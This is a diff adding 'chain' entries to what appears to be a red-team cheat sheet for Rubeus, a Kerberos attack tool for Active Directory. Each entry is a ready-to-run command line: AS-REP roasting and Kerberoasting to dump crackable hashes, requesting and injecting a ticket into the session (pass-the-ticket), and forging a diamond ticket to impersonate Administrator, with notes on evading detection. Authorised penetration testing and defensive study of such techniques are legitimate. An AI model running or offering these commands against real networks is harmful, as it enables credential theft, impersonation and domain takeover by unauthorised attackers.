@@ -3,6 +3,41 @@
 
 <!-- tags: ad,rubeus,kerberos,ticket,kerberoast,asreproast,delegation,exploit -->
 
+> **Chain entries** combine the common Rubeus sequences you'd fire from one shell. Each `&&` link stops if the previous step fails (bad creds, missing privs); `;` is used where a step failing is expected and shouldn't block the next.
+
+---
+
+## rubeus chain roast everything
+AS-REP + Kerberoast stats + Kerberoast all SPNs — three dumps in one invocation. Writes AS-REP hashes to asrep.txt and kerberoast hashes to kerberoast.txt for offline cracking.
+
+```bash
+Rubeus.exe asreproast /nowrap /format:hashcat /outfile:asrep-{{DOMAIN:domain}}.txt ; Rubeus.exe kerberoast /stats ; Rubeus.exe kerberoast /nowrap /format:hashcat /outfile:kerberoast-{{DOMAIN:domain}}.txt
+```
+
+<!-- meta: risk=medium | phase=credaccess | tags=rubeus,chain,asreproast,kerberoast,hashcat -->
+
+---
+
+## rubeus chain ptt workflow
+Request a TGT with password → inject into current session (/ptt) → triage to confirm injection. One shot: "I have a cred, give me the ticket in this session."
+
+```bash
+Rubeus.exe asktgt /user:{{USER:str}} /domain:{{DOMAIN:domain}} /password:{{PASSWORD:str}} /nowrap /ptt && Rubeus.exe triage
+```
+
+<!-- meta: risk=medium | phase=credaccess | tags=rubeus,chain,ptt,asktgt,triage -->
+
+---
+
+## rubeus chain tgtdeleg diamond
+Grab a TGT via unconstrained delegation (/tgtdeleg) → forge a diamond ticket from it (impersonate another user without needing the KRBTGT hash). OPSEC: ticket forging detectable; use on controlled lab or when noise budget allows.
+
+```bash
+Rubeus.exe tgtdeleg /nowrap && Rubeus.exe diamond /tgtdeleg /user:{{IMPERSONATE:str:Administrator}} /nowrap
+```
+
+<!-- meta: risk=high | phase=credaccess | tags=rubeus,chain,tgtdeleg,diamond,forge -->
+
 ---
 
 ## asreproast one user to file
